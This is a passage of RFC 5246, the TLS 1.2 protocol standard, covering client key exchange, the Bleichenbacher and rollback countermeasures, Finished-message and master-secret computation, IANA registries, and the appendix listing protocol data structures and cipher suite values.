Dierks & Rescorla           Standards Track                    [Page 56]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   -  The certificates MUST be signed using an acceptable hash/
      signature algorithm pair, as described in [Section 7.4.4](#section-7.4.4).  Note
      that this relaxes the constraints on certificate-signing
      algorithms found in prior versions of TLS.

   Note that, as with the server certificate, there are certificates
   that use algorithms/algorithm combinations that cannot be currently
   used with TLS.

[7.4.7](#section-7.4.7).  Client Key Exchange Message

   When this message will be sent:

      This message is always sent by the client.  It MUST immediately
      follow the client certificate message, if it is sent.  Otherwise,
      it MUST be the first message sent by the client after it receives
      the ServerHelloDone message.

   Meaning of this message:

      With this message, the premaster secret is set, either by direct
      transmission of the RSA-encrypted secret or by the transmission of
      Diffie-Hellman parameters that will allow each side to agree upon
      the same premaster secret.

      When the client is using an ephemeral Diffie-Hellman exponent,
      then this message contains the client's Diffie-Hellman public
      value.  If the client is sending a certificate containing a static
      DH exponent (i.e., it is doing fixed_dh client authentication),
      then this message MUST be sent but MUST be empty.

   Structure of this message:

      The choice of messages depends on which key exchange method has
      been selected.  See [Section 7.4.3](#section-7.4.3) for the KeyExchangeAlgorithm
      definition.

Dierks & Rescorla           Standards Track                    [Page 57]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      struct {
          select (KeyExchangeAlgorithm) {
              case rsa:
                  EncryptedPreMasterSecret;
              case dhe_dss:
              case dhe_rsa:
              case dh_dss:
              case dh_rsa:
              case dh_anon:
                  ClientDiffieHellmanPublic;
          } exchange_keys;
      } ClientKeyExchange;

[7.4.7.1](#section-7.4.7.1).  RSA-Encrypted Premaster Secret Message

   Meaning of this message:

      If RSA is being used for key agreement and authentication, the
      client generates a 48-byte premaster secret, encrypts it using the
      public key from the server's certificate, and sends the result in
      an encrypted premaster secret message.  This structure is a
      variant of the ClientKeyExchange message and is not a message in
      itself.

   Structure of this message:

      struct {
          ProtocolVersion client_version;
          opaque random[46];
      } PreMasterSecret;

      client_version
         The latest (newest) version supported by the client.  This is
         used to detect version rollback attacks.

      random
         46 securely-generated random bytes.

      struct {
          public-key-encrypted PreMasterSecret pre_master_secret;
      } EncryptedPreMasterSecret;

      pre_master_secret
         This random value is generated by the client and is used to
         generate the master secret, as specified in [Section 8.1](#section-8.1).

Dierks & Rescorla           Standards Track                    [Page 58]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Note: The version number in the PreMasterSecret is the version
   offered by the client in the ClientHello.client_version, not the
   version negotiated for the connection.  This feature is designed to
   prevent rollback attacks.  Unfortunately, some old implementations
   use the negotiated version instead, and therefore checking the
   version number may lead to failure to interoperate with such
   incorrect client implementations.

   Client implementations MUST always send the correct version number in
   PreMasterSecret.  If ClientHello.client_version is TLS 1.1 or higher,
   server implementations MUST check the version number as described in
   the note below.  If the version number is TLS 1.0 or earlier, server
   implementations SHOULD check the version number, but MAY have a
   configuration option to disable the check.  Note that if the check
   fails, the PreMasterSecret SHOULD be randomized as described below.

   Note: Attacks discovered by Bleichenbacher [[BLEI](#ref-BLEI)] and Klima et al.
   [[KPR03](#ref-KPR03)] can be used to attack a TLS server that reveals whether a
   particular message, when decrypted, is properly PKCS#1 formatted,
   contains a valid PreMasterSecret structure, or has the correct
   version number.

   As described by Klima [[KPR03](#ref-KPR03)], these vulnerabilities can be avoided
   by treating incorrectly formatted message blocks and/or mismatched
   version numbers in a manner indistinguishable from correctly
   formatted RSA blocks.  In other words:

      1. Generate a string R of 46 random bytes

      2. Decrypt the message to recover the plaintext M

      3. If the PKCS#1 padding is not correct, or the length of message
         M is not exactly 48 bytes:
            pre_master_secret = ClientHello.client_version || R
         else If ClientHello.client_version <= TLS 1.0, and version
         number check is explicitly disabled:
            pre_master_secret = M
         else:
            pre_master_secret = ClientHello.client_version || M[2..47]

   Note that explicitly constructing the pre_master_secret with the
   ClientHello.client_version produces an invalid master_secret if the
   client has sent the wrong version in the original pre_master_secret.

   An alternative approach is to treat a version number mismatch as a
   PKCS-1 formatting error and randomize the premaster secret
   completely:

Dierks & Rescorla           Standards Track                    [Page 59]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      1. Generate a string R of 48 random bytes

      2. Decrypt the message to recover the plaintext M

      3. If the PKCS#1 padding is not correct, or the length of message
         M is not exactly 48 bytes:
            pre_master_secret = R
         else If ClientHello.client_version <= TLS 1.0, and version
         number check is explicitly disabled:
            premaster secret = M
         else If M[0..1] != ClientHello.client_version:
            premaster secret = R
         else:
            premaster secret = M

   Although no practical attacks against this construction are known,
   Klima et al. [[KPR03](#ref-KPR03)] describe some theoretical attacks, and therefore
   the first construction described is RECOMMENDED.

   In any case, a TLS server MUST NOT generate an alert if processing an
   RSA-encrypted premaster secret message fails, or the version number
   is not as expected.  Instead, it MUST continue the handshake with a
   randomly generated premaster secret.  It may be useful to log the
   real cause of failure for troubleshooting purposes; however, care
   must be taken to avoid leaking the information to an attacker
   (through, e.g., timing, log files, or other channels.)

   The RSAES-OAEP encryption scheme defined in [[PKCS1](#ref-PKCS1)] is more secure
   against the Bleichenbacher attack.  However, for maximal
   compatibility with earlier versions of TLS, this specification uses
   the RSAES-PKCS1-v1_5 scheme.  No variants of the Bleichenbacher
   attack are known to exist provided that the above recommendations are
   followed.

   Implementation note: Public-key-encrypted data is represented as an
   opaque vector <0..2^16-1> (see [Section 4.7](#section-4.7)).  Thus, the RSA-encrypted
   PreMasterSecret in a ClientKeyExchange is preceded by two length
   bytes.  These bytes are redundant in the case of RSA because the
   EncryptedPreMasterSecret is the only data in the ClientKeyExchange
   and its length can therefore be unambiguously determined.  The SSLv3
   specification was not clear about the encoding of public-key-
   encrypted data, and therefore many SSLv3 implementations do not
   include the length bytes -- they encode the RSA-encrypted data
   directly in the ClientKeyExchange message.

   This specification requires correct encoding of the
   EncryptedPreMasterSecret complete with length bytes.  The resulting
   PDU is incompatible with many SSLv3 implementations.  Implementors

Dierks & Rescorla           Standards Track                    [Page 60]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   upgrading from SSLv3 MUST modify their implementations to generate
   and accept the correct encoding.  Implementors who wish to be
   compatible with both SSLv3 and TLS should make their implementation's
   behavior dependent on the protocol version.

   Implementation note: It is now known that remote timing-based attacks
   on TLS are possible, at least when the client and server are on the
   same LAN.  Accordingly, implementations that use static RSA keys MUST
   use RSA blinding or some other anti-timing technique, as described in
   [[TIMING](#ref-TIMING)].

[7.4.7.2](#section-7.4.7.2).  Client Diffie-Hellman Public Value

   Meaning of this message:

      This structure conveys the client's Diffie-Hellman public value
      (Yc) if it was not already included in the client's certificate.
      The encoding used for Yc is determined by the enumerated
      PublicValueEncoding.  This structure is a variant of the client
      key exchange message, and not a message in itself.

   Structure of this message:

      enum { implicit, explicit } PublicValueEncoding;

      implicit
         If the client has sent a certificate which contains a suitable
         Diffie-Hellman key (for fixed_dh client authentication), then
         Yc is implicit and does not need to be sent again.  In this
         case, the client key exchange message will be sent, but it MUST
         be empty.

      explicit
         Yc needs to be sent.

      struct {
          select (PublicValueEncoding) {
              case implicit: struct { };
              case explicit: opaque dh_Yc<1..2^16-1>;
          } dh_public;
      } ClientDiffieHellmanPublic;

      dh_Yc
         The client's Diffie-Hellman public value (Yc).

Dierks & Rescorla           Standards Track                    [Page 61]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[7.4.8](#section-7.4.8).  Certificate Verify

   When this message will be sent:

      This message is used to provide explicit verification of a client
      certificate.  This message is only sent following a client
      certificate that has signing capability (i.e., all certificates
      except those containing fixed Diffie-Hellman parameters).  When
      sent, it MUST immediately follow the client key exchange message.

   Structure of this message:

      struct {
           digitally-signed struct {
               opaque handshake_messages[handshake_messages_length];
           }
      } CertificateVerify;

      Here handshake_messages refers to all handshake messages sent or
      received, starting at client hello and up to, but not including,
      this message, including the type and length fields of the
      handshake messages.  This is the concatenation of all the
      Handshake structures (as defined in [Section 7.4](#section-7.4)) exchanged thus
      far.  Note that this requires both sides to either buffer the
      messages or compute running hashes for all potential hash
      algorithms up to the time of the CertificateVerify computation.
      Servers can minimize this computation cost by offering a
      restricted set of digest algorithms in the CertificateRequest
      message.

      The hash and signature algorithms used in the signature MUST be
      one of those present in the supported_signature_algorithms field
      of the CertificateRequest message.  In addition, the hash and
      signature algorithms MUST be compatible with the key in the
      client's end-entity certificate.  RSA keys MAY be used with any
      permitted hash algorithm, subject to restrictions in the
      certificate, if any.

      Because DSA signatures do not contain any secure indication of
      hash algorithm, there is a risk of hash substitution if multiple
      hashes may be used with any key.  Currently, DSA [[DSS](#ref-DSS)] may only be
      used with SHA-1.  Future revisions of DSS [[DSS-3](#ref-DSS-3)] are expected to
      allow the use of other digest algorithms with DSA, as well as
      guidance as to which digest algorithms should be used with each
      key size.  In addition, future revisions of [[PKIX](#ref-PKIX)] may specify
      mechanisms for certificates to indicate which digest algorithms
      are to be used with DSA.

Dierks & Rescorla           Standards Track                    [Page 62]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[7.4.9](#section-7.4.9).  Finished

   When this message will be sent:

      A Finished message is always sent immediately after a change
      cipher spec message to verify that the key exchange and
      authentication processes were successful.  It is essential that a
      change cipher spec message be received between the other handshake
      messages and the Finished message.

   Meaning of this message:

      The Finished message is the first one protected with the just
      negotiated algorithms, keys, and secrets.  Recipients of Finished
      messages MUST verify that the contents are correct.  Once a side
      has sent its Finished message and received and validated the
      Finished message from its peer, it may begin to send and receive
      application data over the connection.

   Structure of this message:

      struct {
          opaque verify_data[verify_data_length];
      } Finished;

      verify_data
         PRF(master_secret, finished_label, Hash(handshake_messages))
            [0..verify_data_length-1];

      finished_label
         For Finished messages sent by the client, the string
         "client finished".  For Finished messages sent by the server,
         the string "server finished".

      Hash denotes a Hash of the handshake messages.  For the PRF
      defined in [Section 5](#section-5), the Hash MUST be the Hash used as the basis
      for the PRF.  Any cipher suite which defines a different PRF MUST
      also define the Hash to use in the Finished computation.

      In previous versions of TLS, the verify_data was always 12 octets
      long.  In the current version of TLS, it depends on the cipher
      suite.  Any cipher suite which does not explicitly specify
      verify_data_length has a verify_data_length equal to 12.  This
      includes all existing cipher suites.  Note that this
      representation has the same encoding as with previous versions.
      Future cipher suites MAY specify other lengths but such length
      MUST be at least 12 bytes.

Dierks & Rescorla           Standards Track                    [Page 63]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      handshake_messages
         All of the data from all messages in this handshake (not
         including any HelloRequest messages) up to, but not including,
         this message.  This is only data visible at the handshake layer
         and does not include record layer headers.  This is the
         concatenation of all the Handshake structures as defined in
         [Section 7.4](#section-7.4), exchanged thus far.

   It is a fatal error if a Finished message is not preceded by a
   ChangeCipherSpec message at the appropriate point in the handshake.

   The value handshake_messages includes all handshake messages starting
   at ClientHello up to, but not including, this Finished message.  This
   may be different from handshake_messages in [Section 7.4.8](#section-7.4.8) because it
   would include the CertificateVerify message (if sent).  Also, the
   handshake_messages for the Finished message sent by the client will
   be different from that for the Finished message sent by the server,
   because the one that is sent second will include the prior one.

   Note: ChangeCipherSpec messages, alerts, and any other record types
   are not handshake messages and are not included in the hash
   computations.  Also, HelloRequest messages are omitted from handshake
   hashes.

[8](#section-8).  Cryptographic Computations

   In order to begin connection protection, the TLS Record Protocol
   requires specification of a suite of algorithms, a master secret, and
   the client and server random values.  The authentication, encryption,
   and MAC algorithms are determined by the cipher_suite selected by the
   server and revealed in the ServerHello message.  The compression
   algorithm is negotiated in the hello messages, and the random values
   are exchanged in the hello messages.  All that remains is to
   calculate the master secret.

[8.1](#section-8.1).  Computing the Master Secret

   For all key exchange methods, the same algorithm is used to convert
   the pre_master_secret into the master_secret.  The pre_master_secret
   should be deleted from memory once the master_secret has been
   computed.

      master_secret = PRF(pre_master_secret, "master secret",
                          ClientHello.random + ServerHello.random)
                          [0..47];

   The master secret is always exactly 48 bytes in length.  The length
   of the premaster secret will vary depending on key exchange method.

Dierks & Rescorla           Standards Track                    [Page 64]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[8.1.1](#section-8.1.1).  RSA

   When RSA is used for server authentication and key exchange, a 48-
   byte pre_master_secret is generated by the client, encrypted under
   the server's public key, and sent to the server.  The server uses its
   private key to decrypt the pre_master_secret.  Both parties then
   convert the pre_master_secret into the master_secret, as specified
   above.

[8.1.2](#section-8.1.2).  Diffie-Hellman

   A conventional Diffie-Hellman computation is performed.  The
   negotiated key (Z) is used as the pre_master_secret, and is converted
   into the master_secret, as specified above.  Leading bytes of Z that
   contain all zero bits are stripped before it is used as the
   pre_master_secret.

   Note: Diffie-Hellman parameters are specified by the server and may
   be either ephemeral or contained within the server's certificate.

[9](#section-9).  Mandatory Cipher Suites

   In the absence of an application profile standard specifying
   otherwise, a TLS-compliant application MUST implement the cipher
   suite TLS_RSA_WITH_AES_128_CBC_SHA (see [Appendix A.5](#appendix-A.5) for the
   definition).

[10](#section-10).  Application Data Protocol

   Application data messages are carried by the record layer and are
   fragmented, compressed, and encrypted based on the current connection
   state.  The messages are treated as transparent data to the record
   layer.

[11](#section-11).  Security Considerations

   Security issues are discussed throughout this memo, especially in
   Appendices D, E, and F.

[12](#section-12).  IANA Considerations

   This document uses several registries that were originally created in
   [[TLS1.1](#ref-TLS1.1)].  IANA has updated these to reference this document.  The
   registries and their allocation policies (unchanged from [[TLS1.1](#ref-TLS1.1)])
   are listed below.

Dierks & Rescorla           Standards Track                    [Page 65]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   -  TLS ClientCertificateType Identifiers Registry: Future values in
      the range 0-63 (decimal) inclusive are assigned via Standards
      Action [[RFC2434](/doc/html/rfc2434)].  Values in the range 64-223 (decimal) inclusive
      are assigned via Specification Required [[RFC2434](/doc/html/rfc2434)].  Values from
      224-255 (decimal) inclusive are reserved for Private Use
      [[RFC2434](/doc/html/rfc2434)].

   -  TLS Cipher Suite Registry: Future values with the first byte in
      the range 0-191 (decimal) inclusive are assigned via Standards
      Action [[RFC2434](/doc/html/rfc2434)].  Values with the first byte in the range 192-254
      (decimal) are assigned via Specification Required [[RFC2434](/doc/html/rfc2434)].
      Values with the first byte 255 (decimal) are reserved for Private
      Use [[RFC2434](/doc/html/rfc2434)].

   -  This document defines several new HMAC-SHA256-based cipher suites,
      whose values (in [Appendix A.5](#appendix-A.5)) have been allocated from the TLS
      Cipher Suite registry.

   -  TLS ContentType Registry: Future values are allocated via
      Standards Action [[RFC2434](/doc/html/rfc2434)].

   -  TLS Alert Registry: Future values are allocated via Standards
      Action [[RFC2434](/doc/html/rfc2434)].

   -  TLS HandshakeType Registry: Future values are allocated via
      Standards Action [[RFC2434](/doc/html/rfc2434)].

   This document also uses a registry originally created in [[RFC4366](/doc/html/rfc4366)].
   IANA has updated it to reference this document.  The registry and its
   allocation policy (unchanged from [[RFC4366](/doc/html/rfc4366)]) is listed below:

   -  TLS ExtensionType Registry: Future values are allocated via IETF
      Consensus [[RFC2434](/doc/html/rfc2434)].  IANA has updated this registry to include
      the signature_algorithms extension and its corresponding value
      (see [Section 7.4.1.4](#section-7.4.1.4)).

   In addition, this document defines two new registries to be
   maintained by IANA:

   -  TLS SignatureAlgorithm Registry: The registry has been initially
      populated with the values described in [Section 7.4.1.4.1](#section-7.4.1.4.1).  Future
      values in the range 0-63 (decimal) inclusive are assigned via
      Standards Action [[RFC2434](/doc/html/rfc2434)].  Values in the range 64-223 (decimal)
      inclusive are assigned via Specification Required [[RFC2434](/doc/html/rfc2434)].
      Values from 224-255 (decimal) inclusive are reserved for Private
      Use [[RFC2434](/doc/html/rfc2434)].

Dierks & Rescorla           Standards Track                    [Page 66]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   -  TLS HashAlgorithm Registry: The registry has been initially
      populated with the values described in [Section 7.4.1.4.1](#section-7.4.1.4.1).  Future
      values in the range 0-63 (decimal) inclusive are assigned via
      Standards Action [[RFC2434](/doc/html/rfc2434)].  Values in the range 64-223 (decimal)
      inclusive are assigned via Specification Required [[RFC2434](/doc/html/rfc2434)].
      Values from 224-255 (decimal) inclusive are reserved for Private
      Use [[RFC2434](/doc/html/rfc2434)].

      This document also uses the TLS Compression Method Identifiers
      Registry, defined in [[RFC3749](/doc/html/rfc3749)].  IANA has allocated value 0 for
      the "null" compression method.

Dierks & Rescorla           Standards Track                    [Page 67]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[Appendix A](#appendix-A).  Protocol Data Structures and Constant Values

   This section describes protocol types and constants.

[A.1](#appendix-A.1).  Record Layer

   struct {
       uint8 major;
       uint8 minor;
   } ProtocolVersion;

   ProtocolVersion version = { 3, 3 };     /* TLS v1.2*/

   enum {
       change_cipher_spec(20), alert(21), handshake(22),
       application_data(23), (255)
   } ContentType;

   struct {
       ContentType type;
       ProtocolVersion version;
       uint16 length;
       opaque fragment[TLSPlaintext.length];
   } TLSPlaintext;

   struct {
       ContentType type;
       ProtocolVersion version;
       uint16 length;
       opaque fragment[TLSCompressed.length];
   } TLSCompressed;

   struct {
       ContentType type;
       ProtocolVersion version;
       uint16 length;
       select (SecurityParameters.cipher_type) {
           case stream: GenericStreamCipher;
           case block:  GenericBlockCipher;
           case aead:   GenericAEADCipher;
       } fragment;
   } TLSCiphertext;

   stream-ciphered struct {
       opaque content[TLSCompressed.length];
       opaque MAC[SecurityParameters.mac_length];
   } GenericStreamCipher;

Dierks & Rescorla           Standards Track                    [Page 68]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   struct {
       opaque IV[SecurityParameters.record_iv_length];
       block-ciphered struct {
           opaque content[TLSCompressed.length];
           opaque MAC[SecurityParameters.mac_length];
           uint8 padding[GenericBlockCipher.padding_length];
           uint8 padding_length;
       };
   } GenericBlockCipher;

   struct {
      opaque nonce_explicit[SecurityParameters.record_iv_length];
      aead-ciphered struct {
          opaque content[TLSCompressed.length];
      };
   } GenericAEADCipher;

[A.2](#appendix-A.2).  Change Cipher Specs Message

   struct {
       enum { change_cipher_spec(1), (255) } type;
   } ChangeCipherSpec;

[A.3](#appendix-A.3).  Alert Messages

   enum { warning(1), fatal(2), (255) } AlertLevel;

   enum {
       close_notify(0),
       unexpected_message(10),
       bad_record_mac(20),
       decryption_failed_RESERVED(21),
       record_overflow(22),
       decompression_failure(30),
       handshake_failure(40),
       no_certificate_RESERVED(41),
       bad_certificate(42),
       unsupported_certificate(43),
       certificate_revoked(44),
       certificate_expired(45),
       certificate_unknown(46),
       illegal_parameter(47),
       unknown_ca(48),
       access_denied(49),
       decode_error(50),
       decrypt_error(51),
       export_restriction_RESERVED(60),
       protocol_version(70),

Dierks & Rescorla           Standards Track                    [Page 69]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

       insufficient_security(71),
       internal_error(80),
       user_canceled(90),
       no_renegotiation(100),
       unsupported_extension(110),           /* new */
       (255)
   } AlertDescription;

   struct {
       AlertLevel level;
       AlertDescription description;
   } Alert;

[A.4](#appendix-A.4).  Handshake Protocol

   enum {
       hello_request(0), client_hello(1), server_hello(2),
       certificate(11), server_key_exchange (12),
       certificate_request(13), server_hello_done(14),
       certificate_verify(15), client_key_exchange(16),
       finished(20)
       (255)
   } HandshakeType;

   struct {
       HandshakeType msg_type;
       uint24 length;
       select (HandshakeType) {
           case hello_request:       HelloRequest;
           case client_hello:        ClientHello;
           case server_hello:        ServerHello;
           case certificate:         Certificate;
           case server_key_exchange: ServerKeyExchange;
           case certificate_request: CertificateRequest;
           case server_hello_done:   ServerHelloDone;
           case certificate_verify:  CertificateVerify;
           case client_key_exchange: ClientKeyExchange;
           case finished:            Finished;
       } body;
   } Handshake;

Dierks & Rescorla           Standards Track                    [Page 70]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[A.4.1](#appendix-A.4.1).  Hello Messages

   struct { } HelloRequest;

   struct {
       uint32 gmt_unix_time;
       opaque random_bytes[28];
   } Random;

   opaque SessionID<0..32>;

   uint8 CipherSuite[2];

   enum { null(0), (255) } CompressionMethod;

   struct {
       ProtocolVersion client_version;
       Random random;
       SessionID session_id;
       CipherSuite cipher_suites<2..2^16-2>;
       CompressionMethod compression_methods<1..2^8-1>;
       select (extensions_present) {
           case false:
               struct {};
           case true:
               Extension extensions<0..2^16-1>;
       };
   } ClientHello;

   struct {
       ProtocolVersion server_version;
       Random random;
       SessionID session_id;
       CipherSuite cipher_suite;
       CompressionMethod compression_method;
       select (extensions_present) {
           case false:
               struct {};
           case true:
               Extension extensions<0..2^16-1>;
       };
   } ServerHello;

   struct {
       ExtensionType extension_type;
       opaque extension_data<0..2^16-1>;
   } Extension;

Dierks & Rescorla           Standards Track                    [Page 71]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   enum {
       signature_algorithms(13), (65535)
   } ExtensionType;

   enum{
       none(0), md5(1), sha1(2), sha224(3), sha256(4), sha384(5),
       sha512(6), (255)
   } HashAlgorithm;
   enum {
      anonymous(0), rsa(1), dsa(2), ecdsa(3), (255)
   } SignatureAlgorithm;

   struct {
         HashAlgorithm hash;
         SignatureAlgorithm signature;
   } SignatureAndHashAlgorithm;

   SignatureAndHashAlgorithm
    supported_signature_algorithms<2..2^16-1>;

[A.4.2](#appendix-A.4.2).  Server Authentication and Key Exchange Messages

   opaque ASN.1Cert<2^24-1>;

   struct {
       ASN.1Cert certificate_list<0..2^24-1>;
   } Certificate;

   enum { dhe_dss, dhe_rsa, dh_anon, rsa,dh_dss, dh_rsa
          /* may be extended, e.g., for ECDH -- see [[TLSECC](#ref-TLSECC)] */
        } KeyExchangeAlgorithm;

   struct {
       opaque dh_p<1..2^16-1>;
       opaque dh_g<1..2^16-1>;
       opaque dh_Ys<1..2^16-1>;
   } ServerDHParams;     /* Ephemeral DH parameters */

Dierks & Rescorla           Standards Track                    [Page 72]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   struct {
       select (KeyExchangeAlgorithm) {
           case dh_anon:
               ServerDHParams params;
           case dhe_dss:
           case dhe_rsa:
               ServerDHParams params;
               digitally-signed struct {
                   opaque client_random[32];
                   opaque server_random[32];
                   ServerDHParams params;
               } signed_params;
           case rsa:
           case dh_dss:
           case dh_rsa:
               struct {} ;
              /* message is omitted for rsa, dh_dss, and dh_rsa */
           /* may be extended, e.g., for ECDH -- see [[TLSECC](#ref-TLSECC)] */
   } ServerKeyExchange;

   enum {
       rsa_sign(1), dss_sign(2), rsa_fixed_dh(3), dss_fixed_dh(4),
       rsa_ephemeral_dh_RESERVED(5), dss_ephemeral_dh_RESERVED(6),
       fortezza_dms_RESERVED(20),
       (255)
   } ClientCertificateType;

   opaque DistinguishedName<1..2^16-1>;

   struct {
       ClientCertificateType certificate_types<1..2^8-1>;
       DistinguishedName certificate_authorities<0..2^16-1>;
   } CertificateRequest;

   struct { } ServerHelloDone;

Dierks & Rescorla           Standards Track                    [Page 73]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[A.4.3](#appendix-A.4.3).  Client Authentication and Key Exchange Messages

   struct {
       select (KeyExchangeAlgorithm) {
           case rsa:
               EncryptedPreMasterSecret;
           case dhe_dss:
           case dhe_rsa:
           case dh_dss:
           case dh_rsa:
           case dh_anon:
               ClientDiffieHellmanPublic;
       } exchange_keys;
   } ClientKeyExchange;

   struct {
       ProtocolVersion client_version;
       opaque random[46];
   } PreMasterSecret;

   struct {
       public-key-encrypted PreMasterSecret pre_master_secret;
   } EncryptedPreMasterSecret;

   enum { implicit, explicit } PublicValueEncoding;

   struct {
       select (PublicValueEncoding) {
           case implicit: struct {};
           case explicit: opaque DH_Yc<1..2^16-1>;
       } dh_public;
   } ClientDiffieHellmanPublic;

   struct {
        digitally-signed struct {
            opaque handshake_messages[handshake_messages_length];
        }
   } CertificateVerify;

[A.4.4](#appendix-A.4.4).  Handshake Finalization Message

   struct {
       opaque verify_data[verify_data_length];
   } Finished;

Dierks & Rescorla           Standards Track                    [Page 74]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[A.5](#appendix-A.5).  The Cipher Suite

   The following values define the cipher suite codes used in the
   ClientHello and ServerHello messages.

   A cipher suite defines a cipher specification supported in TLS
   Version 1.2.

   TLS_NULL_WITH_NULL_NULL is specified and is the initial state of a
   TLS connection during the first handshake on that channel, but MUST
   NOT be negotiated, as it provides no more protection than an
   unsecured connection.

      CipherSuite TLS_NULL_WITH_NULL_NULL               = { 0x00,0x00 };

   The following CipherSuite definitions require that the server provide
   an RSA certificate that can be used for key exchange.  The server may
   request any signature-capable certificate in the certificate request
   message.

      CipherSuite TLS_RSA_WITH_NULL_MD5                 = { 0x00,0x01 };
      CipherSuite TLS_RSA_WITH_NULL_SHA                 = { 0x00,0x02 };
      CipherSuite TLS_RSA_WITH_NULL_SHA256              = { 0x00,0x3B };
      CipherSuite TLS_RSA_WITH_RC4_128_MD5              = { 0x00,0x04 };
      CipherSuite TLS_RSA_WITH_RC4_128_SHA              = { 0x00,0x05 };
      CipherSuite TLS_RSA_WITH_3DES_EDE_CBC_SHA         = { 0x00,0x0A };
      CipherSuite TLS_RSA_WITH_AES_128_CBC_SHA          = { 0x00,0x2F };
      CipherSuite TLS_RSA_WITH_AES_256_CBC_SHA          = { 0x00,0x35 };
      CipherSuite TLS_RSA_WITH_AES_128_CBC_SHA256       = { 0x00,0x3C };
      CipherSuite TLS_RSA_WITH_AES_256_CBC_SHA256       = { 0x00,0x3D };

   The following cipher suite definitions are used for server-
   authenticated (and optionally client-authenticated) Diffie-Hellman.
   DH denotes cipher suites in which the server's certificate contains
   the Diffie-Hellman parameters signed by the certificate authority
   (CA).  DHE denotes ephemeral Diffie-Hellman, where the Diffie-Hellman
   parameters are signed by a signature-capable certificate, which has
   been signed by the CA.  The signing algorithm used by the server is
   specified after the DHE component of the CipherSuite name.  The
   server can request any signature-capable certificate from the client
   for client authentication, or it may request a Diffie-Hellman
   certificate.  Any Diffie-Hellman certificate provided by the client
   must use the parameters (group and generator) described by the
   server.

Dierks & Rescorla           Standards Track                    [Page 75]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      CipherSuite TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA      = { 0x00,0x0D };
      CipherSuite TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA      = { 0x00,0x10 };
      CipherSuite TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA     = { 0x00,0x13 };
      CipherSuite TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA     = { 0x00,0x16 };
      CipherSuite TLS_DH_DSS_WITH_AES_128_CBC_SHA       = { 0x00,0x30 };
      CipherSuite TLS_DH_RSA_WITH_AES_128_CBC_SHA       = { 0x00,0x31 };
      CipherSuite TLS_DHE_DSS_WITH_AES_128_CBC_SHA      = { 0x00,0x32 };
      CipherSuite TLS_DHE_RSA_WITH_AES_128_CBC_SHA      = { 0x00,0x33 };
      CipherSuite TLS_DH_DSS_WITH_AES_256_CBC_SHA       = { 0x00,0x36 };
      CipherSuite TLS_DH_RSA_WITH_AES_256_CBC_SHA       = { 0x00,0x37 };
      CipherSuite TLS_DHE_DSS_WITH_AES_256_CBC_SHA      = { 0x00,0x38 };
      CipherSuite TLS_DHE_RSA_WITH_AES_256_CBC_SHA      = { 0x00,0x39 };
      CipherSuite TLS_DH_DSS_WITH_AES_128_CBC_SHA256    = { 0x00,0x3E };
      CipherSuite TLS_DH_RSA_WITH_AES_128_CBC_SHA256    = { 0x00,0x3F };
      CipherSuite TLS_DHE_DSS_WITH_AES_128_CBC_SHA256   = { 0x00,0x40 };
      CipherSuite TLS_DHE_RSA_WITH_AES_128_CBC_SHA256   = { 0x00,0x67 };
      CipherSuite TLS_DH_DSS_WITH_AES_256_CBC_SHA256    = { 0x00,0x68 };
      CipherSuite TLS_DH_RSA_WITH_AES_256_CBC_SHA256    = { 0x00,0x69 };
      CipherSuite TLS_DHE_DSS_WITH_AES_256_CBC_SHA256   = { 0x00,0x6A };
      CipherSuite TLS_DHE_RSA_WITH_AES_256_CBC_SHA256   = { 0x00,0x6B };

   The following cipher suites are used for completely anonymous
   Diffie-Hellman communications in which neither party is
   authenticated.  Note that this mode is vulnerable to man-in-the-
   middle attacks.  Using this mode therefore is of limited use: These
   cipher suites MUST NOT be used by TLS 1.2 implementations unless the
   application layer has specifically requested to allow anonymous key
   exchange.  (Anonymous key exchange may sometimes be acceptable, for
   example, to support opportunistic encryption when no set-up for
   authentication is in place, or when TLS is used as part of more
   complex security protocols that have other means to ensure
   authentication.)

      CipherSuite TLS_DH_anon_WITH_RC4_128_MD5          = { 0x00,0x18 };
      CipherSuite TLS_DH_anon_WITH_3DES_EDE_CBC_SHA     = { 0x00,0x1B };
      CipherSuite TLS_DH_anon_WITH_AES_128_CBC_SHA      = { 0x00,0x34 };
      CipherSuite TLS_DH_anon_WITH_AES_256_CBC_SHA      = { 0x00,0x3A };
      CipherSuite TLS_DH_anon_WITH_AES_128_CBC_SHA256   = { 0x00,0x6C };
      CipherSuite TLS_DH_anon_WITH_AES_256_CBC_SHA256   = { 0x00,0x6D };

   Note that using non-anonymous key exchange without actually verifying
   the key exchange is essentially equivalent to anonymous key exchange,
   and the same precautions apply.  While non-anonymous key exchange
   will generally involve a higher computational and communicational
   cost than anonymous key exchange, it may be in the interest of
   interoperability not to disable non-anonymous key exchange when the
   application layer is allowing anonymous key exchange.

Dierks & Rescorla           Standards Track                    [Page 76]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   New cipher suite values have been assigned by IANA as described in
   [Section 12](#section-12).

